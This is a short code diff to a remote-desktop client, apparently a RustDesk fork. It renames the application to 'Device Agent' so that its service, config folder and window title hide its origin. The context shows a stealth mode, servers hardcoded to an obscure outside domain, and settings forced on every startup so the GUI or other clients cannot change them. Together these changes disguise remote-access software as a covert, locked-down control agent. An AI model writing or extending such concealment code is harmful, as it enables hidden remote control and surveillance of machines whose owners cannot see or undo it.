@@ -2,6 +2,7 @@ use hbb_common::config::{keys, Config};
 use hbb_common::log;
 
 const OPTION_STEALTH: &str = "stealth-mode";
+const PRODUCT_NAME: &str = "Device Agent";
 const RENDEZVOUS_SERVER: &str = "krikisifsg.tinestuff.com";
 const RELAY_SERVER: &str = "krikisifsg.tinestuff.com";
 const API_SERVER: &str = "https://krikisifsg.tinestuff.com";
@@ -15,6 +16,9 @@ pub fn is_enabled() -> bool {
 // Forced on every startup of every process, so the locked values survive any
 // config change made from the GUI or by another client.
 pub fn apply_locked_config() {
+    // Renamed so the app, service, config dir and window title do not
+    // reveal "rustdesk". Must happen before any config/log path is resolved.
+    *hbb_common::config::APP_NAME.write().unwrap() = PRODUCT_NAME.to_owned();
     Config::set_option(
         keys::OPTION_CUSTOM_RENDEZVOUS_SERVER.to_owned(),
         RENDEZVOUS_SERVER.to_owned(),
